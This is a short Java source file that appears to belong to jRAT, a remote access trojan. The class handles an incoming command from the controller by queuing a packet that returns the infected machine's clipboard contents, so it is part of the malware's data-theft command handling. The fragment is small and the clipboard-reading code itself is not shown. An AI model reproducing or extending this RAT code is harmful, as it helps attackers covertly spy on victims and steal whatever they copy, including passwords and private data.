package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet41Clipboard;

public class Packet59Clipboard extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.addToSendQueue(new Packet41Clipboard());
	}

}
